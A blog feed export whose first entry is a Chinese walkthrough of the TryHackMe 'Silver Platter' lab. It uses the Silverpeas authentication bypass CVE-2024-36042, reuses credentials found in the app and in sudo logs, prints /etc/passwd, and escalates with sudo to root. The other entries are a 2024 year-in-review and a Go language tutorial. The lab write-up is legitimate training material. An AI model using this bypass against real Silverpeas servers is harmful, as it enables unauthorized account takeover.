    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap 扫一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">159</span>.<span class="hljs-number">147</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c60ad30e212b87c6.png"></p><p>开放了 <code>22，80，8080</code> 端口，重点看看 <code>80</code>、<code>8080</code> 端口</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>点击不同的页面时会在 “contact” 页面中看到一些有用的信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/0323fb05558d585c.png"></p><p>有一个叫 <strong><code>scr1ptkiddy</code></strong> 的用户名，并且有一个叫 <strong><code>Silverpeas</code></strong> 的东西。</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>访问进去发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">404 - Not Found<br></code></pre></td></tr></table></figure><p>扫描了一下目录</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.159.147:8080/</span><br></code></pre></td></tr></table></figure><p>没有有用的信息，尝试一番后在 <code>8080</code> 端口发现有一个 <code>silverpeas</code> 页面，是一个登录页面</p><h1 id="CVE-利用"><a href="#CVE-利用" class="headerlink" title="CVE 利用"></a>CVE 利用</h1><p>最开始尝试了爆破，后来发现不现实，于是去搜了看有没有什么漏洞，在 GitHub 上发现了关于 Silverpeas 的 CVE：CVE-2024-36042，一个身份验证绕过漏洞，<a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d%E3%80%82">https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d。</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">Login</span>=scr1ptkiddy&amp;Password=111&amp;DomainId=0<br>-&gt; <span class="hljs-attribute">Login</span>=scr1ptkiddy&amp;DomainId=0<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f52af2a087f0fa6e.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/04502533f67ea345.png"></p><p>登录成功！</p><h1 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h1><p>进去之后找了一圈也没发现啥一样的东西，不过可以看到有 3 个用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/ca968e98819c6e7a.png"></p><p>挨个用身份验证绕过漏洞去尝试其余两个用户，最后成功登上了 <code>Manager</code> 账户</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf1681240b4dfe6d.png"></p><p>发现了 ssh 登陆凭证</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">Username: tim<br><br>Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/49e8ce2eacc5f759.png"></p><p>通过 ssh 成功登录获取到 user flag</p><h1 id="简单提权"><a href="#简单提权" class="headerlink" title="简单提权"></a>简单提权</h1><p>查看 <code>/etc/passwd</code> 目录，发现还有一个 <code>tyler</code> 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">tim@silver-platter:/home$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br>tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false<br>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>tyler:x:1000:1000:root:/home/tyler:/bin/bash<br>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br>tim:x:1001:1001::/home/tim:/bin/bash<br>dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler:x:1000:1000:root:/home/tyler:/bin/bash<br></code></pre></td></tr></table></figure><p>没办法提权，来看看日志，终于在我一条一条看看了很久之后找到了有用的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dec 13 15:40:33 silver-platter <span class="hljs-built_in">sudo</span>:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3<br></code></pre></td></tr></table></figure><p>看到了<code>password:_Zd_zx7N823/</code></p><p>直接用 su 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tim@silver-platter:/var/log$ su tyler<br>Password:<br>tyler@silver-platter:/var/log$ <span class="hljs-built_in">id</span><br>uid=1000(tyler) gid=1000(tyler) <span class="hljs-built_in">groups</span>=1000(tyler),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),110(lxd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler@silver-platter:~$ <span class="hljs-built_in">sudo</span> -l<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> tyler:<br>Matching Defaults entries <span class="hljs-keyword">for</span> tyler on silver-platter:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User tyler may run the following commands on silver-platter:<br>    (ALL : ALL) ALL<br>tyler@silver-platter:~$ <span class="hljs-built_in">cd</span> /home<br>tyler@silver-platter:/home$ <span class="hljs-built_in">ls</span><br>tim  tyler<br>tyler@silver-platter:/home$ <span class="hljs-built_in">cd</span> tyler<br>tyler@silver-platter:~$ <span class="hljs-built_in">cd</span> /root<br>bash: <span class="hljs-built_in">cd</span>: /root: Permission denied<br></code></pre></td></tr></table></figure><p>输出了 <code>Permission denied</code>，权限还是不够，发现 <code>User tyler may run the following commands on silver-platter:     (ALL : ALL) ALL</code>，所以直接试试 <code>sudo su</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler@silver-platter:~$ <span class="hljs-built_in">sudo</span> su<br>root@silver-platter:/home/tyler# <span class="hljs-built_in">cd</span> /root<br>root@silver-platter:~# <span class="hljs-built_in">ls</span><br>root.txt  snap  start_docker_containers.sh<br>root@silver-platter:~# <span class="hljs-built_in">cat</span> root.txt<br>THM&#123;098f6bcd4621d373cade4e832627b4f6&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f3a65c8f8cf6b607.png"></p><p>拿到 root flag</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 年总结</title>
    <link href="/2025/01/28/2024%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/28/2024%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>虽然没有什么成绩，但也算是成长了一年，新年快乐！</p><span id="more"></span><p>​        忽然之间，曾以为遥远的2025也要到来了，以前从来没有写过年度总结，因为一直觉得自己不是一个成功的人，看着那些优秀的师傅们洋洋洒洒地写下他们的辉煌的战绩，发现自己很难定义这一年真正拥有过什么，收获了什么，就觉得昏昏沉沉的一年就又要过去了。但是 N1nEmAn 师傅说：写年终总结想写就写吧，哪有那么多成功。于是我坐在房间里写下这段话。</p><p>​大一上的时候也学过一些前端、算法，但是学着学着发现我不喜欢，我的确对它们产生不了兴趣，锐评一下：枯燥＋没意思。当时寒假也想着做个动态网站出来，可是最终还是没有产出，遂放弃。大一下开学了，很轻松，突然在五月的某一天开始思考自己到底要学什么，其实非常感谢学长学姐们给了我很多点拨，让我知道了更多信息。</p><p>​六月开始听着学长的建议开始看网络基础（但是感觉自己有一种三天打鱼两天晒网的情况qwq），看了没多久就因为期末周搁置了。暑假开始，因为算法培训留校了两周（其实就是为了留校，我并不想上算法课www），当时想学逆向，按照学姐的建议学习了汇编，嗯…感觉也学的不精。留校期间有幸经过学长推荐打了当时大二拔尖班的内部赛（这算是我打的第一场 CTF比赛wow），CTF也是染上了hhhhhh。</p><p>​回家之后继续看基础，随之而来的有很多新生赛，BaseCTF、MoeCTF 等等（怎么会有这么多新生赛！！！），一边学一边打，太菜了，一个暑假过去才只能做简单题qwq，但是认识了好多厉害的师傅！</p><p>​开学之后也在学，要学的太多了，突然步入了迷茫阶段，感觉大学好短，想学的很多，但是我好像就是很笨，就是学不会，别人一眼就能看出来原理甚至脱口而出答案的东西而我看答案都看不懂。大家都好厉害，我很羡慕认识的这些师傅们可以打比赛，可以拿奖，自己属于是卷又卷不赢，躺又躺不平。每天都在破防当中，是做题时代码分析不出来的破防，是问别的师傅题时听不懂的破防，是看题解时看不明白的破防，是复现不出来的破防，每天不是在破防就是在破防的路上，我常常想，要是我能更聪明一点、更厉害一点就好了。有时候在回宿舍的楼梯间碰见认识的人会被感慨一句学这么晚才回来啊。其实我也不想学这么久，每次回寝室的路上一个人都没有，我也想看一眼就懂，不花费这么多时间。白天几乎满课，真正能静下心来学习的时候很少，想多看一点，有时候甚至都不想回寝室睡觉了。好在夜晚能吹着凉爽的风，也算是平淡生活里的慰藉。</p><p>​九月底通过一个在阿里工作的学长了解到逆向确实不好找工作（学得厉害才行），在经过很久的思想斗争之后决定转向 web，十月开始学习 web，幸运的是有学长带着我，学了一些基础漏洞和挖漏洞技巧，CTF 的 web 方向的题慢慢能做一些了，然后对此产生了兴趣！但是还是感觉自己像半吊子呜呜呜呜呜。</p><p>​十一月开始就慢慢结课，开始复习考试，学习的时间就变得更少了，值得开心的是我搭好了自己的博客跟很多厉害的师傅们加了友链，并且立下 flag 三天更一篇（其实并没有 cat 到呜呜呜呜呜）。</p><p>​十二月，这个月更是重量级，几乎每周都有考试，这个月是一点没学，但是打了国赛（差点进线下，唉遗憾，但还是感谢学长们带我打这么大的比赛），有幸被邀请成为了 RDCTF 的出题人，太菜了只能出签到题和简单题qwq。</p><p>​月底考完 Java 后刚好有几天空闲时间，于是去了一趟北京。这趟北京之旅是人生中不能忘记的体验，领略到了北平的冬，打卡了很多地方吃了很多特色美食，站在什刹海边吹着风不禁想起了赵雷《鼓楼》中的那句歌词：我站在什刹海边，一切的甜蜜都与我无关，这是个拥挤的地方。体验到了人生中的第一场滑雪，南方孩子狂喜！还去逛了清华和北大，去到了北大的未名湖畔，在清华亲眼看到了曾经激励我的那句话：“我可以告诉你当年我也一样郁闷吗？”，肉眼可见他们的精神风貌真的与我们不一样，他们自信昂扬充满激情，图书馆里、教学楼里、楼道里甚至食堂里面都充满了他们学习的身影，高等学府浓厚的学术氛围着实让人羡慕。在天安门排了 13 个小时的队吹了一夜的冷风，终于站在第一排看着冉冉升起的五星红旗迎接 2025 第一个晨曦，军乐队、和平鸽都很幸运地见到了，现场特别震撼，大家都特别激动，拍了很多照片和视频（起码拍了几百张hhhhhhh），运气真的很好，第一次来看升旗就站到了第一排owo。从来没想过小时候只能在电视里见到的首都自己能在 18 岁时踏足于此。</p><p>​快乐是短暂的，回学校的第二天就是考试，等着我的是 4 门考试＋IT 实习呜呜呜呜呜，谁家学校一学期考12 门啊啊啊啊啊啊（被信息安全概论背刺了居然还考栈溢出⊙﹏⊙），数据通信我爱你呜呜呜呜呜。</p><p>​寒假以 CTF 开始（oh，no 戒不掉了），然后开始从零开始的渗透之路（需要学的好多但是好有趣wuw）和挖洞（到底怎样才能自己挖到哇qwq）。打了西湖论剑（爆零了）和春秋杯（坐牢），在某天晚上心血来潮又开始学 go 语言，gogogo！大出血买了人生中第一台相机，LUMIX，好喜欢！。</p><p>​这一年差不多就这样结束了，感觉自己很幸运，遇到了很多很好的人，跟厉害的师傅们也交流过好多，有问题的时候大家都会毫不吝啬地为我提供帮助，真的非常非常非常非常非常非常感谢师傅们（＾～＾）（90°鞠躬）。马上就是大年初一了，真正意义上的新的一年，今年的坎坷，是为了明年更好的相遇，“何时葡萄先熟透 你要静候再静候”（感觉自己变得佛系了hhhhh）。渐渐地我也明白只有自己才是最珍贵的，人各有各，不过尔尔。希望未来的我能拥有一颗像乌萨奇一样坚强、稳定、勇敢的心和乐观的心态，2025，要像师父说的那样：新的一年技术更上一层楼！坚定自信更努力地继续向前奔跑，去成为一个真正厉害的人。</p><p><img src="https://img.dkdun.cn/v1/2025/12/93096e631b884738.png"></p>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅-数据类型&amp;常量&amp;变量&amp;输入输出</title>
    <link href="/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>部分内容和 C 语言的是一样的，所以就只记了不一样的</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-type">byte</span>等价 <span class="hljs-type">uint8</span> 可以表达 ASCII 字符<br><span class="hljs-type">rune</span>等价 <span class="hljs-type">int32</span> 可以表达 Unicode 字符<br><span class="hljs-type">string</span>字符串即字节序列，可以转化为 []<span class="hljs-type">byte</span> 类型即字节切片<br></code></pre></td></tr></table></figure><h2 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">数组[<span class="hljs-number">1</span>]<span class="hljs-type">int</span>长度为 <span class="hljs-number">1</span> 的整型数组<br>切片[]<span class="hljs-type">float64</span><span class="hljs-number">64</span>位浮点数切片<br>映射表<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>键为字符串,值为整型的映射表<br>结构体<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">struct</span>&#123;&#125;Gopher 结构体<br>指针*<span class="hljs-type">int</span><br>函数<span class="hljs-keyword">type</span> f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>无参无返回值的函数<br>接口<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">interface</span>&#123;&#125;Gopher 接口<br>通道<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>整型通道<br></code></pre></td></tr></table></figure><h2 id="零值"><a href="#零值" class="headerlink" title="零值"></a>零值</h2><p>零值又称为 <code>zero value</code> ，并不是指数字零 ，而是说一个类型的空值或默认值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">数字类型<span class="hljs-number">0</span><br>布尔类型<span class="hljs-literal">false</span><br>字符串类型<span class="hljs-string">&quot;&quot;</span><br>数组固定长度的对应类型的零值集合<br>结构体内部字段都是零值的结构体<br>切片、映射表、函数、接口、指针、通道<span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><h2 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h2><p><code>nil</code> 类似于 C 语言中的 <code>null</code> ，但有区别。<code>nil</code> 只是一些引用类型的零值，并且不属于任何类型，仅仅是一个变量。 </p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>常量的声明需要 <code>const</code> 关键字，并且在初始化时必须赋值，不然无法通过编译</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;butter&quot;</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> msg = <span class="hljs-string">&quot;hello butt3rf1y&quot;</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> num = <span class="hljs-number">114514</span> <span class="hljs-comment">// 字面量</span><br><span class="hljs-keyword">const</span> numExpression = (<span class="hljs-number">1</span>+<span class="hljs-number">2</span>+<span class="hljs-number">3</span>) / <span class="hljs-number">2</span> % <span class="hljs-number">100</span> + num <span class="hljs-comment">// 常量表达式</span><br></code></pre></td></tr></table></figure><p>批量声明常量可以用 <code>()</code> ，可以存在多个</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Count = <span class="hljs-number">1</span><br>   Name  = <span class="hljs-string">&quot;butter&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>   Size = <span class="hljs-number">14</span><br>   Len  = <span class="hljs-number">51</span><br>)<br></code></pre></td></tr></table></figure><p>在同一个常量组中，如果前一个常量赋值且后面没有赋值，那么默认后面的和前面赋值常量值相等，也就是说其值默认就是前面常量的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  A = <span class="hljs-number">1</span><br>  B <span class="hljs-comment">// 1</span><br>  C <span class="hljs-comment">// 1</span><br>  D <span class="hljs-comment">// 1</span><br>  E <span class="hljs-comment">// 1</span><br>)<br></code></pre></td></tr></table></figure><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code> 是一个内置常量标识符，表示常量声明中无类型整数序数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> <span class="hljs-literal">iota</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p> 列子</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 1</span><br>   Num2 <span class="hljs-comment">// 2</span><br>   Num3 <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p>也能这样写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span>*<span class="hljs-number">2</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 2</span><br>   Num2 <span class="hljs-comment">// 4</span><br>   Num3 <span class="hljs-comment">// 6</span><br>   Num4 <span class="hljs-comment">// 8</span><br>)<br></code></pre></td></tr></table></figure><p>还可以</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> &lt;&lt; <span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1</span><br>   Num1 <span class="hljs-comment">// 13(iota &lt;&lt; 2) * 3 + 1</span><br>   Num2 <span class="hljs-comment">// 25</span><br>   Num3 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p><code>iota</code> 的值本质上就是 <code>iota</code> 所在行相对于当前 <code>const</code> 分组的第一行的差值。而不同的 <code>const</code> 分组则相互不会影响。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  Num  = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1 第一行</span><br>  Num2 = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 13 第二行</span><br>  _ <span class="hljs-comment">// 25 第三行</span><br>  Num3 <span class="hljs-comment">//37 第四行</span><br>  Num4 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 4 第五行</span><br>  _ <span class="hljs-comment">// 5 第六行</span><br>  Num5 <span class="hljs-comment">// 6 第七行</span><br>)<br></code></pre></td></tr></table></figure><p><strong>总结：<code>iota</code> 在 <code>const</code> 块中从0开始，每次定义一个新常量时递增1，直到用新的 <code>const</code> 重置。如果常量定义中没有显式赋值，则会继承前一个常量的表达式。并且<code>iota</code> 的值在显式使用时才会更新。</strong></p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>在 go 中，通过自定义类型 + const + iota 来实现枚举</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Season <span class="hljs-type">uint8</span><br><br><span class="hljs-keyword">const</span> (<br>Spring Season = <span class="hljs-literal">iota</span><span class="hljs-comment">//0</span><br>Summer<span class="hljs-comment">//1</span><br>Autumn<span class="hljs-comment">//2</span><br>Winter<span class="hljs-comment">//3</span><br>)<br></code></pre></td></tr></table></figure><p>枚举出来的结果实际上就是数字，go 也不支持直接将其转换为字符串，但我们可以通过给自定义类型添加方法来返回其字符串表现形式，实现 <code>Stringer</code> 接口就行</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Season)</span></span> String() <span class="hljs-type">string</span> &#123;<br>  <span class="hljs-keyword">switch</span> s &#123;<br>  <span class="hljs-keyword">case</span> Spring:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;spring&quot;</span><br>  <span class="hljs-keyword">case</span> Summer:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;summer&quot;</span><br>  <span class="hljs-keyword">case</span> Autumn:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;autumn&quot;</span><br>  <span class="hljs-keyword">case</span> Winter:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;winter&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>go 中的声明是后置的，变量的声明会用到 <code>var</code> 关键字，格式为 <code>var 变量名 类型名</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> happy <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> intNUm <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> char <span class="hljs-type">byte</span><br></code></pre></td></tr></table></figure><p>如果要多个同样类型的变量时，可以写在一起</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> h1,h2,h3,h4 <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>声明多个不同类型的变量时，可以使用 <code>()</code>，可以存在多个 <code>()</code></p><figure class="highlight verilog"><table><tr><td 